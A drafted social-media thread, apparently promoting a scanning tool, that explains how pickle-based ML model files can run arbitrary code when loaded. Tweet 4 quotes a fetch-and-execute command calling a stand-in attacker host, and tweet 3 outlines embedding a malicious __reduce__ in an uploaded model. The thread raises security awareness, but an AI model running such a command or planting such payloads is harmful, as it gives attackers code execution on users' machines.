# Twitter/X Thread 01 — Pickle RCE
# Hook: Number-led
# GIF suggestion: demos/malicious-detect.gif (attach to tweet 4 or 5)
# Topic pillar: Model Artifact Security

---

TWEET 1 (hook):
Your ML team is calling torch.load() on files from the internet.

That is remote code execution waiting to happen.

Here is the threat model nobody explains. 🧵

---

TWEET 2:
Pickle is Python's built-in serialisation format.

PyTorch uses it for .pt and .pth files.
scikit-learn uses it for .pkl.
Dozens of ML frameworks use it silently.

The problem: deserialising a pickle file executes arbitrary Python code.

That is not a bug. That is how it was designed.

---

TWEET 3:
The attack is simple.

Upload a model to HuggingFace.
Embed a malicious __reduce__ call in the pickle opcodes.
Wait for someone to download and torch.load() it.

You now have a shell on their machine.

---

TWEET 4 (attach GIF: demos/malicious-detect.gif):
The file looks completely legitimate.

It has weights.
It produces the right outputs when you run inference.
It passes a basic sanity check.

It also ran os.system("curl attacker.com | bash") the moment you loaded it.

---

TWEET 5:
The fix is static analysis.

Read the opcodes before executing.
No sandbox required.
No model loaded.

You can detect malicious patterns in under a second by analysing the raw bytecode.

---

TWEET 6:
Formats with the same problem:

.pkl .pt .pth — Pickle-based
.h5 .keras — Keras Lambda bytecode
.onnx — Custom ops + external data SSRF
.gguf — Metadata injection, n_kv overflow
.safetensors — Header injection

Scan all of them. Load none of them blindly.

---

TWEET 7 (CTA):
If your CI pipeline downloads models, you need a gate before the load step.

sentinel artifact ./models -f sarif

24 formats. 0 models loaded. SARIF output to GitHub Security tab.

github.com/EresusSecurity/Eresus-sentinel
